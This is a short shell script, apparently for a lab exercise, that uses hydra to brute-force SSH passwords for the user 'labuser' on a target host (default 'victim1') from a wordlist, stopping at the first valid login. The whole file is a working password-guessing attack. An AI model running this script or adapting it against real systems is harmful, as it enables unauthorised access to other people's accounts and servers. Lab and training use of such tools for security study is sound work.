#!/bin/sh
set -eu

target="${1:-victim1}"
hydra -l labuser -P /usr/share/wordlists/sentinel-passwords.txt \
  -t 4 -f "ssh://${target}"
